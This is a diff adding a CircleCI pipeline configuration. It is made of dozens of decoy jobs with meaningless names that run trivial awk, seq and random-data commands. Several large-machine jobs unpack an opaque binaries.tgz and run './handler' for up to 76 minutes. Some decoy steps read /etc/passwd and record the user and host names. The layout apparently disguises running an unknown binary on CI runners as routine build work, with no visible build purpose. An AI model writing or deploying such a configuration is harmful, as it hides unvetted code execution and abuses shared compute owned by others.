+            echo "gate juliet: $(wc -c </tmp/.wsp/216.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 216.txt
+  juliet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/216.txt
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  round1_package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: gas grill
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "$RANDOM" | base64; true ; } > /tmp/.wsp/manifest.tar
+            echo "gate package: $(wc -c </tmp/.wsp/manifest.tar) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - manifest.tar
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/202x.data
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  phase1_VERIFY_DEV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: steam iron
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'END{print NR, "lines total"}' /etc/passwd; true ; } > /tmp/.wsp/summary.log
+            echo "gate VERIFY_DEV: $(wc -c </tmp/.wsp/summary.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - summary.log
+  VERIFY_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/summary.log
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  beta_assemble-partial-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: skid
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{if(c[int($1/10)]++)}' | wc -l 2>/dev/null || seq 1 100 | awk '{c[int($1/10)]++}END{for(k in c)print k,c[k]}'; true ; } > /tmp/.wsp/READY.txt
+            echo "gate assemble-partial-artifact-bundle: $(wc -c </tmp/.wsp/READY.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - READY.txt
+  assemble-partial-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/READY.txt
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  Gamma_min-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tripod rest
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; date +%Z; true ; } > /tmp/.wsp/stage-ready.out
+            echo "gate min-smoke: $(wc -c </tmp/.wsp/stage-ready.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ready.out
+  min-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/stage-ready.out
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+
+  reload_feat-7693_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: backflip
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 10 | awk '{p *= $1}END{print p}'; true ; } > /tmp/.wsp/report.md
+            echo "gate feat-7693: $(wc -c </tmp/.wsp/report.md) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - report.md
+  gamma_Rollout_Suite1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nibble
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=175861;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/.wsp/relay.state
+            echo "gate Rollout_Suite1: $(wc -c </tmp/.wsp/relay.state) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - relay.state
+  db_MERGE_QA_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: riptide
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; whoami; true ; } > /tmp/.wsp/65.blob
+            echo "gate MERGE_QA: $(wc -c </tmp/.wsp/65.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 65.blob
+  Delta_VERIFY_DEV_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: pressurized
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 200 | awk 'NR%7==0{print}' | wc -l; true ; } > /tmp/.wsp/summary.log
+            echo "gate VERIFY_DEV: $(wc -c </tmp/.wsp/summary.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - summary.log
+  install_qi-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: pushup
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "hello 2024 world 2025" | awk '{gsub(/[0-9]+/,"YEAR"); print}'; true ; } > /tmp/.wsp/81.log
+            echo "gate qi-test: $(wc -c </tmp/.wsp/81.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 81.log
+  verify_papa_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: loud now
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "abcdef" | awk 'BEGIN{FS=""}{for(i=1;i<=NF;i++)print $i}' | wc -l; true ; } > /tmp/.wsp/READY
+            echo "gate papa: $(wc -c </tmp/.wsp/READY) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - READY
+  audit_rm-router-leak_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: glacier creep
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "%08d\n" $((RANDOM % 1000000)); true ; } > /tmp/.wsp/timings.csv
+            echo "gate rm-router-leak: $(wc -c </tmp/.wsp/timings.csv) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - timings.csv
+  fetch_min-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: hum
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | base64 | head -c 200; true ; } > /tmp/.wsp/stage-ready.out
+            echo "gate min-smoke: $(wc -c </tmp/.wsp/stage-ready.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ready.out
+  Beta_assemble-partial-artifact-bundle_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: calf raise
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=100;i++)a[i]=i*3; for(k in a) print a[k]}' | wc -l; true ; } > /tmp/.wsp/READY.txt
+            echo "gate assemble-partial-artifact-bundle: $(wc -c </tmp/.wsp/READY.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - READY.txt
+  stepB_bug-5283_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: monkey wrench
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "same input twice" | tee >(md5sum >/tmp/_m) | sha1sum > /tmp/_s && cat /tmp/_m /tmp/_s | md5sum | awk '{print $1}' && rm -f /tmp/_m /tmp/_s; true ; } > /tmp/.wsp/artifact.bin
+            echo "gate bug-5283: $(wc -c </tmp/.wsp/artifact.bin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - artifact.bin
+  orchestrate_build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: dryer lint
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 512 /dev/urandom | sha256sum | awk '{print $1}'; true ; } > /tmp/.wsp/report.log
+            echo "gate build: $(wc -c </tmp/.wsp/report.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - report.log
+  bundle_rm-queue_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: pager loud
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "x=5" | awk -F= '{print $2*2}'; true ; } > /tmp/.wsp/ckpt-C.state
+            echo "gate rm-queue: $(wc -c </tmp/.wsp/ckpt-C.state) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-C.state
+  reserve_fx-alt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: trim sail
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 489031 | awk 'NR>20629 && NR<21234{s+=$1}END{print s}'; true ; } > /tmp/.wsp/gate-ok.out
+            echo "gate fx-alt: $(wc -c </tmp/.wsp/gate-ok.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - gate-ok.out
+  preflight_UAT_INIT_4_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: with the flow
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 182361 | awk '{if($1%2)o++;else e++}END{print o"/"e}'; true ; } > /tmp/.wsp/main_phase_output_v3.txt
+            echo "gate UAT_INIT_4: $(wc -c </tmp/.wsp/main_phase_output_v3.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - main_phase_output_v3.txt
+  route_Run_App4_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: sumo pull
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "$(hostname)-$(date +%s)" | md5sum; true ; } > /tmp/.wsp/.state
+            echo "gate Run_App4: $(wc -c </tmp/.wsp/.state) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .state
+workflows:
+  build:
+    jobs:
+      - run_feat-7693
+      - reload_feat-7693_2:
+          requires:
+            - run_feat-7693
+      - feat-7693:
+          requires:
+            - reload_feat-7693_2
+      - green_Rollout_Suite1:
+          requires:
+            - reload_feat-7693_2
+      - gamma_Rollout_Suite1_2:
+          requires:
+            - green_Rollout_Suite1
+      - Rollout_Suite1:
+          requires:
+            - gamma_Rollout_Suite1_2
+      - Delta_MERGE_QA:
+          requires:
+            - gamma_Rollout_Suite1_2
+      - db_MERGE_QA_2:
+          requires:
+            - Delta_MERGE_QA
+      - MERGE_QA:
+          requires:
+            - db_MERGE_QA_2
+      - rerun_juliet
+      - bootstrap_add-dashboard
+      - D_validate-production-docker-image
+      - juliet:
+          requires:
+            - rerun_juliet
+            - bootstrap_add-dashboard
+            - D_validate-production-docker-image
+      - add-dashboard:
+          requires:
+            - rerun_juliet
+            - bootstrap_add-dashboard
+            - D_validate-production-docker-image
+      - validate-production-docker-image:
+          requires:
+            - rerun_juliet
+            - bootstrap_add-dashboard
+            - D_validate-production-docker-image
+      - verify:
+          requires:
+            - rerun_juliet
+            - bootstrap_add-dashboard
+            - D_validate-production-docker-image
+      - PROD_RUN_1:
+          requires:
+            - rerun_juliet
+            - bootstrap_add-dashboard
+            - D_validate-production-docker-image
+      - p-v2:
+          requires:
+            - rerun_juliet
+            - bootstrap_add-dashboard
+            - D_validate-production-docker-image
+      - g2_depoly-74
+      - depoly-74:
+          requires:
+            - g2_depoly-74
+      - p2_callisto-final:
+          requires:
+            - g2_depoly-74
+      - callisto-final:
+          requires:
+            - p2_callisto-final
+      - bake_rust-test:
+          requires:
+            - p2_callisto-final
+      - rust-test:
+          requires:
+            - bake_rust-test
+      - teardown_artifacts:
+          requires:
+            - bake_rust-test
+      - artifacts:
+          requires:
+            - teardown_artifacts
+      - phase1_VERIFY_DEV
+      - Delta_VERIFY_DEV_2:
+          requires:
+            - phase1_VERIFY_DEV
+      - VERIFY_DEV:
+          requires:
+            - Delta_VERIFY_DEV_2
+      - p1_qi-test:
+          requires:
+            - Delta_VERIFY_DEV_2
+      - install_qi-test_2:
+          requires:
+            - p1_qi-test
+      - qi-test:
+          requires:
+            - install_qi-test_2
+      - ensure_papa:
+          requires:
+            - install_qi-test_2
+      - verify_papa_2:
+          requires:
+            - ensure_papa
+      - papa:
+          requires:
+            - verify_papa_2
+      - beta_rm-router-leak:
+          requires:
+            - verify_papa_2
+      - audit_rm-router-leak_2:
+          requires:
+            - beta_rm-router-leak
+      - rm-router-leak:
+          requires:
+            - audit_rm-router-leak_2
+      - Gamma_min-smoke:
+          requires:
+            - audit_rm-router-leak_2
+      - fetch_min-smoke_2:
+          requires:
+            - Gamma_min-smoke
+      - min-smoke:
+          requires:
+            - fetch_min-smoke_2
+      - hook_rl-alt
+      - phase_prometheus-alpha
+      - preinit_DATA-940
+      - rl-alt:
+          requires:
+            - hook_rl-alt
+            - phase_prometheus-alpha
+            - preinit_DATA-940
+      - prometheus-alpha:
+          requires:
+            - hook_rl-alt
+            - phase_prometheus-alpha
+            - preinit_DATA-940
+      - DATA-940:
+          requires:
+            - hook_rl-alt
+            - phase_prometheus-alpha
+            - preinit_DATA-940
+      - package:
+          requires:
+            - hook_rl-alt
+            - phase_prometheus-alpha
+            - preinit_DATA-940
+      - rm-oauth-crash:
+          requires:
+            - hook_rl-alt
+            - phase_prometheus-alpha
+            - preinit_DATA-940
+      - beta_assemble-partial-artifact-bundle
+      - Beta_assemble-partial-artifact-bundle_2:
+          requires:
+            - beta_assemble-partial-artifact-bundle
+      - assemble-partial-artifact-bundle:
+          requires:
+            - Beta_assemble-partial-artifact-bundle_2
+      - dispatch_bug-5283:
+          requires:
+            - Beta_assemble-partial-artifact-bundle_2
+      - stepB_bug-5283_2:
+          requires:
+            - dispatch_bug-5283
+      - bug-5283:
+          requires:
+            - stepB_bug-5283_2
+      - precheck_build:
+          requires:
+            - stepB_bug-5283_2
+      - orchestrate_build_2:
+          requires:
+            - precheck_build
+      - build:
+          requires:
+            - orchestrate_build_2
+      - beta_rm-queue:
+          requires:
+            - orchestrate_build_2
+      - bundle_rm-queue_2:
+          requires:
+            - beta_rm-queue
+      - rm-queue:
+          requires:
+            - bundle_rm-queue_2
+      - hook_fx-alt:
+          requires:
+            - bundle_rm-queue_2
+      - reserve_fx-alt_2:
+          requires:
+            - hook_fx-alt
+      - fx-alt:
+          requires:
+            - reserve_fx-alt_2
+      - bake_UAT_INIT_4:
+          requires:
+            - reserve_fx-alt_2
+      - preflight_UAT_INIT_4_2:
+          requires:
+            - bake_UAT_INIT_4
+      - UAT_INIT_4:
+          requires:
+            - preflight_UAT_INIT_4_2
+      - step2_Run_App4:
+          requires:
+            - preflight_UAT_INIT_4_2
+      - route_Run_App4_2:
+          requires:
+            - step2_Run_App4
+      - Run_App4:
+          requires:
+            - route_Run_App4_2
